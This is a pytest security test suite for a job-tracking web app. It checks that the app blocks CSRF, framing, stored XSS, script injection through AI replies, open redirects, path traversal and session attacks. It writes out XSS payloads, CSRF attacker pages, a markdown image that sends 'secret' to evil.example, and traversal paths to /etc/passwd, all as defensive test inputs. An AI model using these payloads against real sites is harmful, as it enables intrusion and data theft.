"""Attacks from a real browser: another website trying to act as the user, frame the app, or
inject script through data the app shows (role names, profile fields, AI replies, emails)."""
import time

import httpx
import pytest

from jobhq.ai.runner import Result

from .conftest import wait_for

pytestmark = pytest.mark.e2e

XSS = ['<script>window.__pwned=1</script>', '<img src=x onerror="window.__pwned=1">', '"><svg onload="window.__pwned=1">',
       "javascript:window.__pwned=1", "{{7*7}}", "${7*7}", "<a href=javascript:window.__pwned=1>x</a>"]


def test_other_site_cannot_post_as_the_user(signed_in, attacker):
    page = signed_in
    live = page.live
    rid = live.ctx.roles.create({"company": "Acme", "title": "Ops", "status": "applied"})
    attacker.pages["/csrf"] = f"""<form id=f method=POST action="{live.base}/roles/{rid}">
      <input name=status value=withdrawn></form><script>document.getElementById('f').submit()</script>"""
    attacker.pages["/fetch"] = f"""<script>
      fetch("{live.base}/reminders", {{method: "POST", credentials: "include", mode: "no-cors",
        headers: {{"Content-Type": "application/x-www-form-urlencoded"}}, body: "text=evil&preset=hour"}});
      fetch("{live.base}/settings/sessions/end-all", {{method: "POST", credentials: "include", mode: "no-cors"}});
    </script>"""
    page.goto(f"{attacker.base}/csrf")
    page.wait_for_timeout(800)
    page.goto(f"{attacker.base}/fetch")
    page.wait_for_timeout(800)
    assert live.ctx.roles.get(rid)["status"] == "applied"
    assert live.ctx.reminders.pending() == []
    page.goto(f"{live.base}/")
    assert not page.url.endswith("/login")  # still signed in: sign-out-everywhere was blocked too


def test_other_site_cannot_frame_the_app(signed_in, attacker):
    page = signed_in
    attacker.pages["/frame"] = f'<iframe id=f src="{page.live.base}/settings" width=800 height=600></iframe>'
    blocked = []
    page.on("console", lambda m: "frame-ancestors" in m.text and blocked.append(m.text))
    page.goto(f"{attacker.base}/frame")
    page.wait_for_timeout(1000)
    frame = page.frame_locator("#f")
    assert frame.locator("text=Signed-in devices").count() == 0
    page.problems.clear()  # the refusal itself logs a console error, which is the point


def test_stored_script_never_runs(signed_in):
    page = signed_in
    ctx = page.live.ctx
    for i, payload in enumerate(XSS):
        rid = ctx.roles.create({"company": f"{payload} Co", "title": payload, "notes": payload, "posting": payload, "next_step": payload,
                                "next_step_date": "2026-01-01"})
        ctx.roles.add_event(rid, "note", "2026-01-01", payload)
        ctx.reminders.set(payload, time.time() + 3600 + i)
        ctx.db.run("INSERT INTO profile_questions (topic, question, reason, created) VALUES (?, ?, ?, 0)", (f"t{i}", payload, payload))
        ctx.proposals.file("profile_fact", payload, {"text": payload})
    from jobhq.profile import clean_basics
    ctx.profile.save_basics(clean_basics({"name": XSS[1], "headline": XSS[0], "summary": XSS[2], "target_titles": XSS[0]})[0])
    ctx.db.run("INSERT INTO experience (company, title, summary) VALUES (?, ?, ?)", (XSS[1], XSS[0], XSS[2]))
    tid = ctx.db.run("INSERT INTO chat_threads (kind, title, created, updated) VALUES ('chat', ?, 0, 0)", (XSS[0],)).lastrowid
    for payload in XSS:
        ctx.db.run("INSERT INTO chat_messages (thread_id, role, content, at) VALUES (?, 'assistant', ?, 0)", (tid, payload + " [x](javascript:alert(1))"))
        ctx.db.run("INSERT INTO chat_messages (thread_id, role, content, at) VALUES (?, 'user', ?, 0)", (tid, payload))
    ctx.db.run("INSERT INTO inbox_items (message_id, received, sender, subject, kind, outcome, status, created) "
               "VALUES ('x1', 0, ?, ?, 'employer', ?, 'review', 0)", (XSS[1], XSS[0], XSS[2]))
    pages = ["/", "/roles", "/roles?show=closed", "/profile", "/suggestions", f"/chat?t={tid}", "/interview", "/reminders", "/intake",
             "/practice"] + [f"/roles/{r['id']}" for r in ctx.roles.all()]
    for path in pages:
        page.goto(path)
        page.wait_for_timeout(150)
        assert page.evaluate("window.__pwned") is None, f"script ran on {path}"
        hrefs = page.eval_on_selector_all("a[href]", "els => els.map(e => e.getAttribute('href'))")
        assert not [h for h in hrefs if h.strip().lower().startswith("javascript")], f"javascript: link on {path}"
    assert list(page.problems) == []


def test_ai_reply_cannot_inject_script(signed_in):
    page = signed_in
    live = page.live
    live.ctx.settings.set("claude_api_key", "sk-ant-x")
    live.runner.script["chat"] = lambda *_: Result(ok=True, text=XSS[0] + XSS[1] + " ![leak](https://evil.example/x.png?data=secret) "
                                                   "<iframe src=https://evil.example></iframe>")
    page.goto("/chat")
    page.fill("textarea[name=text]", "hi")
    page.keyboard.press("Enter")
    page.wait_for_selector(".msg.assistant:not(.pending)", timeout=15000)
    assert page.evaluate("window.__pwned") is None
    assert page.locator(".msg.assistant img, .msg.assistant iframe, .msg.assistant script").count() == 0
    requested = []
    page.on("request", lambda r: requested.append(r.url))
    page.reload()
    page.wait_for_timeout(500)
    assert not [u for u in requested if "evil.example" in u]
    assert list(page.problems) == []


def test_open_redirects_are_refused(live):
    from starlette.requests import Request

    from jobhq.web.common import redirect
    req = Request({"type": "http", "headers": [(b"hx-request", b"true")], "method": "POST", "path": "/"})
    for target in ("//evil.example", "https://evil.example", "/\\evil.example"):
        resp = redirect(req, target)
        assert resp.headers.get("hx-redirect") in ("/", "/\\evil.example")
    resp = httpx.get(f"{live.base}/jobs/1?done_url=//evil.example", follow_redirects=False)
    assert resp.status_code in (303, 401)  # signed out: goes to /login, never offsite


def test_path_traversal_and_ids(live):
    for path in ["/static/../app.py", "/static/..%2fapp.py", "/static/%2e%2e/%2e%2e/etc/passwd", "/documents/..%2f..%2fapp.db/pdf"]:
        resp = httpx.get(f"{live.base}{path}", follow_redirects=False)
        assert resp.status_code in (303, 400, 404), path
        assert b"import" not in resp.content and b"root:" not in resp.content


def test_session_cookie_cannot_be_read_by_script(signed_in):
    page = signed_in
    assert "jobhq" not in page.evaluate("document.cookie")
    cookie = next(c for c in page.context.cookies() if c["name"] == "jobhq")
    assert cookie["httpOnly"] and cookie["sameSite"] == "Lax"


def test_session_fixation_is_prevented(browser_page):
    page = browser_page
    live = page.live
    planted, _ = live.ctx.sessions.create("attacker")
    page.context.add_cookies([{"name": "jobhq", "value": planted, "url": live.base}])
    page.goto("/auth/google")  # signing in again while the planted cookie is present
    page.wait_for_url(f"{live.base}/")
    now = next(c for c in page.context.cookies() if c["name"] == "jobhq")["value"]
    assert now != planted and live.ctx.sessions.lookup(planted) is None


def test_signed_out_user_gets_nothing(live):
    paths = ["/", "/roles", "/roles/1", "/export", "/documents/1/pdf", "/chat/msg/1", "/jobs/1", "/settings"]
    for path in paths:
        resp = httpx.get(f"{live.base}{path}", follow_redirects=False)
        assert resp.status_code == 303 and resp.headers["location"] == "/login", path
    for path in ["/roles", "/chat/1/send", "/push/subscribe", "/settings/claude", "/undo/1"]:
        resp = httpx.post(f"{live.base}{path}", data={"x": "1"}, headers={"Origin": live.base}, follow_redirects=False)
        assert resp.status_code == 403, path


def test_brute_force_sign_in_is_slowed(live):
    codes = [httpx.get(f"{live.base}/auth/google", follow_redirects=False).status_code for _ in range(25)]
    assert codes.count(429) >= 5


def test_forged_push_action_tokens(live, signed_in):
    page = signed_in
    rid = live.ctx.reminders.set("x", time.time() + 3600)
    good = live.ctx.reminders.action_token(rid)
    tampered = good[:-3] + ("AAA" if not good.endswith("AAA") else "BBB")
    for token in (tampered, "x.y", good.split(".")[0] + ".", ""):
        resp = page.request.post(f"/push/action/{token}/done")
        assert resp.status in (403, 404, 405)
    assert live.ctx.reminders.get(rid)["status"] == "pending"
    assert page.request.post(f"/push/action/{good}/done").status == 204
    wait_for(lambda: live.ctx.reminders.get(rid)["status"] == "done")
